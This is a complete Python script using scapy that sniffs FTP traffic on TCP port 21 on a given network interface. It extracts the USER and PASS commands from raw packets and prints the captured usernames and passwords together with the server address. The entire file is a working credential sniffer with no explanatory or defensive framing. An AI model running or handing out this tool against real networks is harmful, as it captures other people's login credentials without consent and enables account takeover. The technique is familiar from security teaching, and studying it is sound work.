import re
import argparse
from scapy.all import *

def argparser() -> argparse.Namespace | None:
    parser = argparse.ArgumentParser()

    try:
        parser.add_argument("interface", type=str, help="Interface to sniff")
    except argparse.ArgumentError as e:
        print(e)

    return parser.parse_args()

def sniffer(pkt: scapy.packet.Packet) -> None:
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf("%Raw.load%")
    user = re.findall('(?i)USER (.*)', raw)
    passwd = re.findall('(?i)PASS (.*)', raw)

    if user:
        print(f">> FTP LOGIN DETECTED ON : {str(dest)}")
        print(f">> USER {str(user[0])}")
    elif passwd:
        print(f">> PASS {str(passwd[0])}")

def main() -> None:
    args = argparser()

    try:
        print(">> sniffing...")
        sniff(filter="tcp port 21", prn=sniffer, iface=args.interface)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()